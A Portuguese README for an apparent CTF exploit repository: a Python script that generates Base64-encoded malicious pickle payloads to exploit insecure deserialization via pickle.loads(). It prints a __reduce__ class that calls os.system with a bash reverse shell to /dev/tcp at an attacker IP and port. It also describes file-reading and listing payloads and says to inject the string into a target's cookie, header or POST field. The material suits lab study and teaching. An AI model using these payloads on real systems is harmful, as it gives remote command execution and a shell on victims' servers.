# insecure-deserialization-python

Projeto desenvolvido para explorar vulnerabilidade em um desafio do hackingclub. O objetivo do script é gerar payloads maliciosos serializados com a biblioteca `pickle` e codificados em Base64, explorando a falta de sanitização na entrada de dados em aplicações que utilizam `pickle.loads()`.

> **Contexto:**

A vulnerabilidade explorada ocorre quando uma aplicação aceita objetos serializados de fontes não confiáveis. No Python, o módulo `pickle` permite que objetos arbitrários definam como devem ser "reconstruídos" através do método mágico `__reduce__`. Ao manipular este método, é possível instruir a aplicação a executar comandos do sistema operacional (`os.system`) no momento da desserialização.

## Funcionalidades

O script gera automaticamente três tipos de payloads comuns em testes de intrusão:

1.  **Leitura de Arquivo:** Executa `cat flag.txt` para capturar a flag do desafio. Pode ser alterado para ler outros arquivos. 
2.  **Reconhecimento:** Executa `ls -la` para listar arquivos no diretório atual.
3.  **Reverse Shell:** Um payload de exemplo para estabelecer uma conexão reversa.

## Como Usar

1.  Clone o repositório:
    ```bash
    git clone [https://github.com/pedroalmeidap/insecure-deserialization-python](https://github.com/pedroalmeidap/insecure-deserialization-python)
    cd nome-do-repo
    ```

2.  **Configuração (Opcional):**
    Caso queira utilizar o payload de *Reverse Shell*, edite o arquivo `exploit.py` e altere o IP e a Porta na classe `Reverse`:
    ```python
    class Reverse:
        def __reduce__(self):
            # Altere o IP (10.0.12.173) e a PORTA (4444) para o seu listener
            cmd = ('bash -c "bash -i >& /dev/tcp/SEU_IP/SUA_PORTA 0>&1"',)
            return (os.system, cmd)
    ```
    
3.  Execute o gerador:
    ```bash
    python3 exploit.py
    ```

4.  Copie a string Base64 gerada e injete no campo vulnerável da aplicação alvo (Cookie, Header ou Parâmetro POST).
